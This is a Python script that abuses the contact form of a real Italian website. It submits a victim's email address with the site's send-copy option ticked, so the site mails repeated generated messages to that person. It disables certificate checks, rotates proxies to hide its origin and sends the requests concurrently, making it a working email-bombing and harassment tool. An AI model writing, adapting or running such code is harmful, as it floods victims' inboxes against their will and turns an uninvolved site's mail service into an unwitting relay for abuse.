from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Origin': 'http://www.tieffea.it',
            'Pragma': 'no-cache',
            'Proxy-Connection': 'keep-alive',
            'Referer': 'http://www.tieffea.it/en/?id=contactform&s=nano',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        }

        params = {
            'id': 'contactform',
            's': 'nano',
        }

        text = self.get_text()
        data = {
            'send_form': '1',
            'id': 'contactform',
            's': 'nano',
            'Name': 'text',
            'Email': target,
            'Website': 'text',
            'Betreff': text,
            'Nachricht': text,
            'kopie': 'checkbox',
        }

        response = requests.post('http://www.tieffea.it/en/index.php',
                                 params=params, headers=headers, data=data,
                                 verify=False,
                                 proxies=self.get_proxies(), timeout=10
                                 )
        return response


def main():
    s = 'Successfully send.'

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
